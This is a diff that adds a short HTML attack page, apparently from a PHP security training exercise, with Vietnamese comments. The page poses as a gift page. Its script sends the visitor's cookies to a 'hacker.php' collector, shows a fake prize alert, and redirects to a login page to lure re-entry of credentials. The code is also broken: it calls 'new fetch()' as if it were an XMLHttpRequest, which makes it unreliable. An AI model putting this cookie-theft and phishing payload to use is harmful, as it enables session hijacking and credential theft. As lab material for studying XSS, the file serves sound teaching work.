@@ -1,0 +1,23 @@
+<!-- attack.html - File độc hại -->
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trang độc hại</title>
+</head>
+<body>
+    <h1>Chào mừng đến trang quà tặng!</h1>
+    <script>
+        // Tấn công XSS đánh cắp cookie
+        var stolenCookie = document.cookie;
+        var xhr = new fetch();
+        xhr.open('GET', 'http://localhost/11-training-php/hacker.php?cookie=' + encodeURIComponent(stolenCookie), true);
+        xhr.send();
+        
+        // Hiển thị thông báo giả mạo
+        alert('Bạn đã trúng thưởng! Vui lòng đăng nhập lại để nhận quà.');
+        window.location.href = 'http://localhost/11-training-php/login.php';
+    </script>
+</body>
+</html>
